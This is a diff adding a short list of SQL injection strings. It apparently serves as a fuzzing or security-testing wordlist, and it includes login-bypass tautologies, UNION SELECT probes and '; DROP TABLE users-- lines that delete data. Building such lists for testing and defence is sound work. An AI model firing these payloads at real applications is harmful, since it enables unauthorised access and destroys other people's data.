@@ -1,0 +1,11 @@
+' OR '1'='1
+" OR "1"="1
+' UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL--
+'; DROP TABLE users--
+"; DROP TABLE users--
+' OR 1=1 --
+" OR 1=1 --
+' AND 1=1--
+" AND 1=1--
+'
